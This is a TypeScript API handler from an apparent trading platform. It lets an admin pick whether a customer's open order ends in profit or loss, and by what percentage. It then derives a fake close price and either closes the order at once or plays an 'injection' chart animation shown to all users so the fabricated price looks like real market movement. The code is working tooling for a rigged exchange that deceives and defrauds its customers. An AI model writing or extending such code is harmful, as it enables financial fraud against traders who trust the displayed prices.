import ApiResponseHandler from '../apiResponseHandler';
import MongooseRepository from '../../database/repositories/mongooseRepository';
import TradeOrder from '../../database/models/tradeOrder';
import Wallet from '../../database/models/wallet';
import Error404 from '../../errors/Error404';

const CONTRACT_SIZE = 100;

export default async (req, res, next) => {
  try {
    const currentTenant = MongooseRepository.getCurrentTenant(req);

    const { id } = req.params;
    const { profitPercent, control, delayMs } = req.body;

    if (profitPercent === undefined || profitPercent === null) {
      return res.status(400).json({ errors: [{ message: 'profitPercent is required' }] });
    }
    if (!control || !['profit', 'loss'].includes(control)) {
      return res.status(400).json({ errors: [{ message: 'control must be "profit" or "loss"' }] });
    }

    const pct = Math.max(0, Math.min(100, Number(profitPercent)));
    if (pct <= 0) {
      return res.status(400).json({ errors: [{ message: 'profitPercent must be greater than 0' }] });
    }

    // delayMs = 0 → immediate close; > 0 → chart animation injection (default 10 min)
    const delay = Math.max(0, Math.min(86_400_000, Number(delayMs ?? 600_000)));

    const TradeOrderModel = TradeOrder(req.database);
    const order = await TradeOrderModel.findById(id);

    if (!order || String(order.tenant) !== String(currentTenant.id)) throw new Error404();
    if (order.status !== 'active') {
      return res.status(400).json({ errors: [{ message: `Cannot close order with status: ${order.status}` }] });
    }

    const estMargin = (order as any).estimatedMargin ?? (order as any).margin ?? 0;

    // ── Calculate P&L ─────────────────────────────────────────────────────
    const pnlAbs = parseFloat(((estMargin * pct) / 100).toFixed(5));
    const netPnl = control === 'profit' ? pnlAbs : -pnlAbs;

    // Derive synthetic closePrice consistent with netPnl
    const priceDiff = (netPnl + ((order as any).fee || 0)) / (((order as any).lots || 1) * CONTRACT_SIZE);
    const rawClose  = (order as any).direction === 'buy'
      ? ((order as any).entryPrice || 0) + priceDiff
      : ((order as any).entryPrice || 0) - priceDiff;
    const closePrice = parseFloat(rawClose.toFixed(5));

    if (delay === 0) {
      // ── Immediate close (admin convenience: no animation) ──────────────
      await TradeOrderModel.updateOne(
        { _id: id, tenant: currentTenant.id },
        {
          $set: {
            status:      'closed',
            closePrice,
            closeReason: 'manual',
            closeTime:   new Date(),
            pnl:         netPnl,
            // Clear any lingering injection fields
            injectionTargetPrice: null,
            injectionStartedAt:   null,
            injectionDurationMs:  null,
            injectionPnl:         null,
            injectionEstMargin:   null,
          },
        }
      );

      const walletReturn = estMargin + netPnl;
      const WalletModel  = Wallet(req.database);
      await WalletModel.findOneAndUpdate(
        { user: (order as any).user, symbol: 'USDT', tenant: currentTenant.id, accountType: 'exchange' },
        { $inc: { amount: walletReturn } },
        { upsert: false }
      );
    } else {
      // ── Injection: chart animates for ALL users; order stays 'active' ──
      // Customer can still close manually at any time.
      // list.ts lazy-finalizes the order once the duration elapses.
      await TradeOrderModel.updateOne(
        { _id: id, tenant: currentTenant.id },
        {
          $set: {
            injectionTargetPrice: closePrice,
            injectionStartedAt:   new Date(),
            injectionDurationMs:  delay,
            injectionPnl:         netPnl,
            injectionEstMargin:   estMargin,
          },
        }
      );
      // Wallet is NOT updated here — it's credited when the order actually closes.
    }

    const updated = await TradeOrderModel.findById(id);
    await ApiResponseHandler.success(req, res, updated);
  } catch (error) {
    await ApiResponseHandler.error(req, res, error);
  }
};
